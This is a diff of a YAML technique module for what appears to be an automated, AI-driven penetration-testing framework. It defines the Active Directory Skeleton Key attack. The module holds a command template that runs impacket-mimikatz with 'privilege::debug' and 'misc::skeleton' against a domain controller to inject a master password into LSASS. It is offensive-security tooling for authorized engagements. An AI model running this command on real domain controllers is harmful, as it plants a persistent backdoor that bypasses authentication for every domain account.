@@ -6,8 +6,7 @@ preconditions:
 - has_cred
 parameters:
   target_ip: from_engagement.target_ip
-command_template: impacket-mimikatz -dc-ip {target_ip} '{domain}/{username}:{password}'
-  'privilege::debug' 'misc::skeleton'
+command_template: impacket-mimikatz -dc-ip {target_ip} '{domain}/{username}:{password}' 'privilege::debug' 'misc::skeleton'
 parser: generic_parser
 expected_effects:
 - skeleton_key_installed
@@ -16,7 +15,17 @@ falsifier:
   pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: The **Skeleton Key attack** is a technique that allows attackers to **bypass
-  Active Directory authentication** by **injecting a master password** into the LSASS
-  process of each domain controller.
+mechanism: The **Skeleton Key attack** is a technique that allows attackers to **bypass Active Directory authentication**
+  by **injecting a master password** into the LSASS process of each domain controller.
 hacktricks_ref: windows-hardening/active-directory-methodology/README.md
+references:
+  ocd_mindmap_node_ids:
+  - 0e85fb0ef2
+  - 4a78adc22a
+  - 5f42c63992
+  - b4f09bae49
+  - bc3de52b83
+  - be7ddb81ae
+  - c7c8e928c7
+  - cd0a1d2990
+  - e01d3b2bfb
